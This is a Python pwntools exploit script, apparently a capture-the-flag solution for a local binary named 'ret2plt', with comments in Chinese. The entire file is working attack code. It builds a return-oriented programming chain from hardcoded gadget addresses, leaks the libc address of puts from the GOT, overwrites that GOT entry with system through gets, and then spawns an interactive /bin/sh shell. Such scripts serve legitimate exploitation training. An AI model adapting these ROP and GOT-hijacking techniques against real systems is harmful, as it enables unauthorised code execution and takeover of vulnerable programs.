#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

context.arch = "amd64"
p = process("./ret2plt")

p.recvuntil("Try your best :")

# padding 40

#################################
# gadget
pop_rdi = 0x00000000004006f3
puts_got = 0x0000000000601018
puts = 0x00000000004004e0
gets = 0x0000000000400510



payload = cyclic(40)
# leak 出 puts 在 libc 中真正的位置
payload += flat([pop_rdi, puts_got, puts])
# 呼叫 gets()，並把資料蓋到 puts_got 藉此引發 GOT Hijacking
payload += flat([pop_rdi, puts_got, gets])
# 重新呼叫 puts()，此時的 puts() 已被 GOT Hijack，所以這邊會 Get Shell 
payload += flat([pop_rdi, puts_got+8, puts]) # +8 是因為 "/bin/sh\x00" 排在 puts_got (system) 後面
p.sendline(payload)

p.recvuntil("!\n")

libc_base = u64(p.recvuntil("\n")[:-1].ljust(8,"\x00")) - 0x6f690
system = libc_base + 0x45390
p.sendline(p64(system) + "/bin/sh\x00")


p.interactive()


